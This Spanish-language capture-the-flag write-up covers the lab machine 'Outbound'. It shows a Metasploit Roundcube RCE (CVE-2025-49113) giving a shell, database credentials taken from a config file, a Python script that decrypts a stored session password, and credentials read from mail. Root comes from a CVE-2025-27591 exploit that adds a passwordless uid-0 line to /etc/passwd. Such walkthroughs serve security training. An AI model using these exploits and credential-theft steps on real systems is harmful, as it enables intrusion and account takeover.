### 1. Enumeración inicial

Añadimos el dominio `mail.outbound.htb` a `/etc/hosts`. Hacemos un escaneo completo de puertos:

```bash
sudo nmap -p- --open --min-rate 5000 -vvv -n -Pn 10.10.11.77 -oG allPorts
[sudo] contraseña para abra: 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.98 ( https://nmap.org ) at 2025-11-07 14:28 +0000
Initiating SYN Stealth Scan at 14:28
Scanning 10.10.11.77 [65535 ports]
Discovered open port 22/tcp on 10.10.11.77
Discovered open port 80/tcp on 10.10.11.77
Completed SYN Stealth Scan at 14:29, 15.32s elapsed (65535 total ports)
Nmap scan report for 10.10.11.77
Host is up, received user-set (0.079s latency).
Scanned at 2025-11-07 14:28:56 WET for 15s
Not shown: 64997 closed tcp ports (reset), 536 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 15.43 seconds
           Raw packets sent: 76212 (3.353MB) | Rcvd: 74124 (2.965MB)
```

![[1]](img/1.png)

---

### 2. Explotación de Roundcube

Buscando un poco, este Roundcube es una versión vulnerable a RCE: https://www.exploit-db.com/exploits/52324

En este caso a la fecha en la que escribo este writeup lo más funcional que hay en internet disponible para explotar esta vulnerabilidad es un payload de metasploit:

```bash
msfconsole
```

```bash
msf > search roundcube

Matching Modules
================

   #  Name                                                  Disclosure Date  Rank       Check  Description
   -  ----                                                  ---------------  ----       -----  -----------
   0  exploit/multi/http/roundcube_auth_rce_cve_2025_49113  2025-06-02       excellent  Yes    Roundcube Post-Auth RCE via PHP Object Deserialization
```

Usamos el módulo listado:

```bash
use exploit/multi/http/roundcube_auth_rce_cve_2025_49113
```

```bash
set RHOSTS mail.outbound.htb
set USERNAME tyler
set PASSWORD LhKL1o9Nm3X2
set LHOST 10.10.14.209
set TARGETURI /
exploit
shell
```

---

### 3. Acceso a base de datos

Ya con esto tenemos una shell. Hay que escalar privilegios, investigando un poco veo que hay estos tres usuarios en `/home`:

```bash
ls /home
jacob
mel
tyler
```

Veo también varios ficheros importantes en `/var/www/html/roundcube/config`:

```bash
ls -l
total 76
-rw-r--r-- 1 root     root      3024 Jun  6 18:55 config.inc.php
-rw-r--r-- 1 www-data www-data  2943 Feb  8  2025 config.inc.php.sample
-rw-r--r-- 1 www-data www-data 65000 Feb  8  2025 defaults.inc.php
-rw-r--r-- 1 www-data www-data  2806 Feb  8  2025 mimetypes.php
pwd 
```
Voy a leer el `config.inc.php`:

```php
cat config.inc.php
<?php

/*
 +-----------------------------------------------------------------------+
 | Local configuration for the Roundcube Webmail installation.           |
 |                                                                       |
 | This is a sample configuration file only containing the minimum       |
 | setup required for a functional installation. Copy more options       |
 | from defaults.inc.php to this file to override the defaults.          |
 |                                                                       |
 | This file is part of the Roundcube Webmail client                     |
 | Copyright (C) The Roundcube Dev Team                                  |
 |                                                                       |
 | Licensed under the GNU General Public License version 3 or            |
 | any later version with exceptions for skins & plugins.                |
 | See the README file for a full license statement.                     |
 +-----------------------------------------------------------------------+
*/

$config = [];

// Database connection string (DSN) for read+write operations
// Format (compatible with PEAR MDB2): db_provider://user:password@host/database
// Currently supported db_providers: mysql, pgsql, sqlite, mssql, sqlsrv, oracle
// For examples see http://pear.php.net/manual/en/package.database.mdb2.intro-dsn.php
// NOTE: for SQLite use absolute path (Linux): 'sqlite:////full/path/to/sqlite.db?mode=0646'
//       or (Windows): 'sqlite:///C:/full/path/to/sqlite.db'
$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';

// IMAP host chosen to perform the log-in.
// See defaults.inc.php for the option description.
$config['imap_host'] = 'localhost:143';

// SMTP server host (for sending mails).
// See defaults.inc.php for the option description.
$config['smtp_host'] = 'localhost:587';

// SMTP username (if required) if you use %u as the username Roundcube
// will use the current username for login
$config['smtp_user'] = '%u';

// SMTP password (if required) if you use %p as the password Roundcube
// will use the current user's password for login
$config['smtp_pass'] = '%p';

// provide an URL where a user can get support for this Roundcube installation
// PLEASE DO NOT LINK TO THE ROUNDCUBE.NET WEBSITE HERE!
$config['support_url'] = '';

// Name your service. This is displayed on the login screen and in the window title
$config['product_name'] = 'Roundcube Webmail';

// This key is used to encrypt the users imap password which is stored
// in the session record. For the default cipher method it must be
// exactly 24 characters long.
// YOUR KEY MUST BE DIFFERENT THAN THE SAMPLE VALUE FOR SECURITY REASONS
$config['des_key'] = 'rcmail-!24ByteDESkey*Str';

// List of active plugins (in plugins/ directory)
$config['plugins'] = [
    'archive',
    'zipdownload',
];

// skin name: folder from skins/
$config['skin'] = 'elastic';
$config['default_host'] = 'localhost';
$config['smtp_server'] = 'localhost';
```

**Tenemos las credenciales de la base de datos en el archivo:**

```bash
$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';
```

Usuario: roundcube

Contraseña: RCDBPass2025

Host: localhost

Base de datos: roundcube

Nos conectamos a la base de datos:

```bash
mysql -u roundcube -pRCDBPass2025 -h localhost roundcube
```

---

### 4. Descifrado de contraseñas

En la base de datos hay una sesión de PHP en base64 en la tabla **session**.

```sql
select * from session;
```

Lo convertimos a texto claro:

```bash
echo "bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjE7dXNlcm5hbWV8czo1OiJqYWNvYiI7c3RvcmFnZV9ob3N0fHM6OToibG9jYWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6Ikw3UnYwMEE4VHV3SkFyNjdrSVR4eGNTZ25JazI1QW0vIjtsb2dpbl90aW1lfGk6MTc0OTM5NzExOTt0aW1lem9uZXxzOjEzOiJFdXJvcGUvTG9uZG9uIjtTVE9SQUdFX1NQRUNJQUwtVVNFfGI6MTthdXRoX3NlY3JldHxzOjI2OiJEcFlxdjZtYUk5SHhETDVHaGNDZDhKYVFRVyI7cmVxdWVzdF90b2tlbnxzOjMyOiJUSXNPYUFCQTF6SFNYWk9CcEg2dXA1WEZ5YXlOUkhhdyI7dGFza3xzOjQ6Im1haWwiO3NraW5fY29uZmlnfGE6Nzp7czoxNzoic3VwcG9ydGVkX2xheW91dHMiO2E6MTp7aTowO3M6MTA6IndpZGVzY3JlZW4iO31zOjIyOiJqcXVlcnlfdWlfY29sb3JzX3RoZW1lIjtzOjk6ImJvb3RzdHJhcCI7czoxODoiZW1iZWRfY3NzX2xvY2F0aW9uIjtzOjE3OiIvc3R5bGVzL2VtYmVkLmNzcyI7czoxOToiZWRpdG9yX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTc6ImRhcmtfbW9kZV9zdXBwb3J0IjtiOjE7czoyNjoibWVkaWFfYnJvd3Nlcl9jc3NfbG9jYXRpb24iO3M6NDoibm9uZSI7czoyMToiYWRkaXRpb25hbF9sb2dvX3R5cGVzIjthOjM6e2k6MDtzOjQ6ImRhcmsiO2k6MTtzOjU6InNtYWxsIjtpOjI7czoxMDoic21hbGwtZGFyayI7fX1pbWFwX2hvc3R8czo5OiJsb2NhbGhvc3QiO3BhZ2V8aToxO21ib3h8czo1OiJJTkJPWCI7c29ydF9jb2x8czowOiIiO3NvcnRfb3JkZXJ8czo0OiJERVNDIjtTVE9SQUdFX1RIUkVBRHxhOjM6e2k6MDtzOjEwOiJSRUZFUkVOQ0VTIjtpOjE7czo0OiJSRUZTIjtpOjI7czoxNDoiT1JERVJFRFNVQkpFQ1QiO31TVE9SQUdFX1FVT1RBfGI6MDtTVE9SQUdFX0xJU1QtRVhURU5ERUR8YjoxO2xpc3RfYXR0cmlifGE6Njp7czo0OiJuYW1lIjtzOjg6Im1lc3NhZ2VzIjtzOjI6ImlkIjtzOjExOiJtZXNzYWdlbGlzdCI7czo1OiJjbGFzcyI7czo0MjoibGlzdGluZyBtZXNzYWdlbGlzdCBzb3J0aGVhZGVyIGZpeGVkaGVhZGVyIjtzOjE1OiJhcmlhLWxhYmVsbGVkYnkiO3M6MjI6ImFyaWEtbGFiZWwtbWVzc2FnZWxpc3QiO3M6OToiZGF0YS1saXN0IjtzOjEyOiJtZXNzYWdlX2xpc3QiO3M6MTQ6ImRhdGEtbGFiZWwtbXNnIjtzOjE4OiJUaGUgbGlzdCBpcyBlbXB0eS4iO311bnNlZW5fY291bnR8YToyOntzOjU6IklOQk9YIjtpOjI7czo1OiJUcmFzaCI7aTowO31mb2xkZXJzfGE6MTp7czo1OiJJTkJPWCI7YToyOntzOjM6ImNudCI7aToyO3M6NjoibWF4dWlkIjtpOjM7fX1saXN0X21vZF9zZXF8czoyOiIxMCI7" | base64 -d
language|s:5:"en_US";imap_namespace|a:4:{s:8:"personal";a:1:{i:0;a:2:{i:0;s:0:"";i:1;s:1:"/";}}s:5:"other";N;s:6:"shared";N;s:10:"prefix_out";s:0:"";}imap_delimiter|s:1:"/";imap_list_conf|a:2:{i:0;N;i:1;a:0:{}}user_id|i:1;username|s:5:"jacob";storage_host|s:9:"localhost";storage_port|i:143;storage_ssl|b:0;password|s:32:"L7Rv00A8TuwJAr67kITxxcSgnIk25Am/";login_time|i:1749397119;timezone|s:13:"Europe/London";STORAGE_SPECIAL-USE|b:1;auth_secret|s:26:"DpYqv6maI9HxDL5GhcCd8JaQQW";request_token|s:32:"TIsOaABA1zHSXZOBpH6up5XFyayNRHaw";task|s:4:"mail";skin_config|a:7:{s:17:"supported_layouts";a:1:{i:0;s:10:"widescreen";}s:22:"jquery_ui_colors_theme";s:9:"bootstrap";s:18:"embed_css_location";s:17:"/styles/embed.css";s:19:"editor_css_location";s:17:"/styles/embed.css";s:17:"dark_mode_support";b:1;s:26:"media_browser_css_location";s:4:"none";s:21:"additional_logo_types";a:3:{i:0;s:4:"dark";i:1;s:5:"small";i:2;s:10:"small-dark";}}imap_host|s:9:"localhost";page|i:1;mbox|s:5:"INBOX";sort_col|s:0:"";sort_order|s:4:"DESC";STORAGE_THREAD|a:3:{i:0;s:10:"REFERENCES";i:1;s:4:"REFS";i:2;s:14:"ORDEREDSUBJECT";}STORAGE_QUOTA|b:0;STORAGE_LIST-EXTENDED|b:1;list_attrib|a:6:{s:4:"name";s:8:"messages";s:2:"id";s:11:"messagelist";s:5:"class";s:42:"listing messagelist sortheader fixedheader";s:15:"aria-labelledby";s:22:"aria-label-messagelist";s:9:"data-list";s:12:"message_list";s:14:"data-label-msg";s:18:"The list is empty.";}unseen_count|a:2:{s:5:"INBOX";i:2;s:5:"Trash";i:0;}folders|a:1:{s:5:"INBOX";a:2:{s:3:"cnt";i:2;s:6:"maxuid";i:3;}}list_mod_seq|s:2:"10";%  
```

Tenemos el usuario jacob, y la contraseña **encriptada** `L7Rv00A8TuwJAr67kITxxcSgnIk25Am/`.

La contraseña está encriptada con posiblemente el des_key que vimos antes en config.inc.php: `rcmail-!24ByteDESkey*Str`, además en el contenido desencriptado de base64, vemos el auth_secret y el request_token. Todos esos valores se los voy a meter en un script de python para sacar la contraseña desencriptada:

```python
#!/usr/bin/env python3
import base64
from Crypto.Cipher import DES3
from Crypto.Util.Padding import unpad

def decrypt_roundcube_password(encrypted_data, des_key):
    """
    Decrypt RoundCube password using 3DES CBC with extracted IV
    Format: base64(IV + encrypted_data)
    """
    try:
        # Step 1: Base64 decode the encrypted data
        decoded_data = base64.b64decode(encrypted_data)
        
        # Step 2: Extract IV (first 8 bytes) and encrypted data (remaining bytes)
        iv = decoded_data[:8]
        encrypted_bytes = decoded_data[8:]
        
        # Step 3: Prepare the 3DES key (24 bytes)
        key = des_key.encode('utf-8')[:24]
        
        # Step 4: Create 3DES cipher in CBC mode with extracted IV
        cipher = DES3.new(key, DES3.MODE_CBC, iv)
        
        # Step 5: Decrypt the data
        decrypted_padded = cipher.decrypt(encrypted_bytes)
        
        # Step 6: Remove padding
        try:
            decrypted = unpad(decrypted_padded, DES3.block_size)
        except:
            # Manual padding removal if automatic fails
            decrypted = decrypted_padded.rstrip(b'\x00\x01\x02\x03\x04\x05\x06\x07\x08')
        
        # Step 7: Return as string
        return decrypted.decode('utf-8', errors='ignore').strip()
        
    except Exception as e:
        return f"Decryption failed: {str(e)}"

def main():
    # RoundCube DES key
    des_key = 'rcmail-!24ByteDESkey*Str'
    
    # Your encrypted data
    password = 'L7Rv00A8TuwJAr67kITxxcSgnIk25Am/'
    auth_secret = 'DpYqv6maI9HxDL5GhcCd8JaQQW'
    request_token = 'TIsOaABA1zHSXZOBpH6up5XFyayNRHaw'
    
    print("RoundCube Password Decryption")
    print("=" * 35)
    
    # Decrypt jacob's password
    decrypted_password = decrypt_roundcube_password(password, des_key)
    print(f"Username: jacob")
    print(f"Password: {decrypted_password}")
    print()
    
    # Try the other data too
    print("Other data:")
    print(f"Auth Secret: {decrypt_roundcube_password(auth_secret, des_key)}")
    print(f"Request Token: {decrypt_roundcube_password(request_token, des_key)}")
    
    # Show the decryption details for analysis
    print(f"\nDecryption Method: 3DES CBC with extracted IV")
    decoded = base64.b64decode(password)
    print(f"IV (hex): {decoded[:8].hex()}")
    print(f"Encrypted data (hex): {decoded[8:].hex()}")

if __name__ == "__main__":
    main()
```

Ejecución del script:

```bash
python3 desencrypt.py
RoundCube Password Decryption
===================================
Username: jacob
Password: 595mO8DmwGeD

Other data:
Auth Secret: Decryption failed: Incorrect padding
Request Token: 2n	T#6y

Decryption Method: 3DES CBC with extracted IV
IV (hex): 2fb46fd3403c4eec
Encrypted data (hex): 0902bebb9084f1c5c4a09c8936e409bf
```

Nos autenticamos en la máquina con `jacob:595mO8DmwGeD`.

```bash
www-data@mail:/$ su jacob 
Password: 
jacob@mail:/$ 
```

---

### 5. Escalada a usuario jacob en host

Ahora con jacob nos metemos en su home. En **/home/jacob/mail/INBOX/jacob** hay un mensaje:

```bash
jacob@mail:~/mail/INBOX$ cat jacob
From tyler@outbound.htb  Sat Jun 07 14:00:58 2025
Return-Path: <tyler@outbound.htb>
X-Original-To: jacob
Delivered-To: jacob@outbound.htb
Received: by outbound.htb (Postfix, from userid 1000)
	id B32C410248D; Sat,  7 Jun 2025 14:00:58 +0000 (UTC)
To: jacob@outbound.htb
Subject: Important Update
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <20250607140058.B32C410248D@outbound.htb>
Date: Sat,  7 Jun 2025 14:00:58 +0000 (UTC)
From: tyler@outbound.htb
X-IMAPbase: 1749304753 0000000002
X-UID: 1
Status: 
X-Keywords:                                                                       
Content-Length: 233

Due to the recent change of policies your password has been changed.

Please use the following credentials to log into your account: gY4Wr3a1evp4

Remember to change your password when you next log into your account.

Thanks!

Tyler

From mel@outbound.htb  Sun Jun 08 12:09:45 2025
Return-Path: <mel@outbound.htb>
X-Original-To: jacob
Delivered-To: jacob@outbound.htb
Received: by outbound.htb (Postfix, from userid 1002)
	id 1487E22C; Sun,  8 Jun 2025 12:09:45 +0000 (UTC)
To: jacob@outbound.htb
Subject: Unexpected Resource Consumption
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <20250608120945.1487E22C@outbound.htb>
Date: Sun,  8 Jun 2025 12:09:45 +0000 (UTC)
From: mel@outbound.htb
X-UID: 2
Status: 
X-Keywords:                                                                       
Content-Length: 261

We have been experiencing high resource consumption on our main server.
For now we have enabled resource monitoring with Below and have granted you privileges to inspect the the logs.
Please inform us immediately if you notice any irregularities.

Thanks!

Mel
```

Vemos unas credenciales diferentes de Jacob, actualmente estamos dentro de un contenedor:

```bash
jacob@mail:~$ ls -la /.dockerenv
-rwxr-xr-x 1 root root 0 Jun  8 12:26 /.dockerenv
```

El puerto 22 estaba abierto, voy a probar a acceder con jacob, **y la contraseña del correo:** `gY4Wr3a1evp4`

```bash
ssh jacob@10.10.11.77
jacob@10.10.11.77's password: 
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-63-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Fri Nov  7 03:55:00 PM UTC 2025

  System load:  0.06              Processes:             296
  Usage of /:   74.9% of 6.73GB   Users logged in:       1
  Memory usage: 17%               IPv4 address for eth0: 10.10.11.77
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Fri Nov  7 15:55:01 2025 from 10.10.14.209
jacob@outbound:~$ ls -l
total 1060
-rw-rw-r-- 1 jacob jacob   3255 Nov  7 15:50 exploit.py
-rwxrw-r-- 1 jacob jacob    334 Nov  7 15:47 exploit.sh
-rwxrwxr-x 1 jacob jacob 971926 Nov  4 10:40 linpeas.sh
-rw-r--r-- 1 root  root    2560 Nov  7 14:58 snapshot_01762527514_01762527514.9i6Vh7
-rw-r--r-- 1 root  root    2560 Nov  7 14:58 snapshot_01762527529_01762527529.tja3Ql
-rw-r--r-- 1 root  root    2560 Nov  7 15:42 snapshot_01762530144_01762530144.BoPIm1
-rw-r--r-- 1 root  root   31232 Nov  7 15:43 snapshot_01762530191_01762530191.vmHO68
-rw-r--r-- 1 root  root   31232 Nov  7 15:43 snapshot_01762530231_01762530231.wBTdBg
-rw-r--r-- 1 root  root    2560 Nov  7 15:44 snapshot_01762530252_01762530252.pnS1Th
-rw-r--r-- 1 root  root    2560 Nov  7 15:44 snapshot_01762530263_01762530263.jrUGvi
-rw-r--r-- 1 root  root    2560 Nov  7 15:45 snapshot_01762530337_01762530337.LuG5ev
-rw-r--r-- 1 root  root    2560 Nov  7 15:47 snapshot_01762530476_01762530476.0BHTsf
-rw-r--r-- 1 root  root    2560 Nov  7 15:48 snapshot_01762530495_01762530495.uAyOO4
-rw-r----- 1 root  jacob     33 Nov  7 14:32 user.txt
```

Tenemos el user flag.

---

### 6. Escalada de privilegios a root

Para escalar usaremos en la máquina este mismo script:

https://github.com/BridgerAlderson/CVE-2025-27591-PoC

Es una vulnerabilidad (la única que existe en el momento que realicé la máquina) para el `/usr/bin/below`, el cual habiamos leído en el correo que nuestro usuario tenia permisos para leer/modificar los logs, haciendo un `sudo -l` nos damos cuenta de ello. Pasamos el script a la máquina, lo ejecutamos y automáticamente ganamos acceso como root:

```python
#!/usr/bin/env python3
import os
import subprocess
import sys
import pty

BINARY = "/usr/bin/below"
LOG_DIR = "/var/log/below"
TARGET_LOG = f"{LOG_DIR}/error_root.log"
TMP_PAYLOAD = "/tmp/attacker"

MALICIOUS_PASSWD_LINE = "attacker::0:0:attacker:/root:/bin/bash\n"

def check_world_writable(path):
    st = os.stat(path)
    return bool(st.st_mode & 0o002)

def is_symlink(path):
    return os.path.islink(path)
```

```bash
jacob@outbound:~$ python3 exploit.py
[*] Checking for CVE-2025-27591 vulnerability...
[+] /var/log/below is world-writable.
[!] /var/log/below/error_root.log is a regular file. Removing it...
[+] Symlink created: /var/log/below/error_root.log -> /etc/passwd
[+] Target is vulnerable.
[*] Starting exploitation...
[+] Wrote malicious passwd line to /tmp/attacker
[+] Symlink set: /var/log/below/error_root.log -> /etc/passwd
[*] Executing 'below record' as root to trigger logging...
Nov 07 16:03:13.659 DEBG Starting up!
Nov 07 16:03:13.660 ERRO 
----------------- Detected unclean exit ---------------------
Error Message: Failed to acquire file lock on index file: /var/log/below/store/index_01762473600: EAGAIN: Try again
-------------------------------------------------------------
[+] 'below record' executed.
[*] Appending payload into /etc/passwd via symlink...
[+] Payload appended successfully.
[*] Attempting to switch to root shell via 'su attacker'...

root@outbound:/home/jacob#
```

Con esto ya tenemos vulnerada la máquina.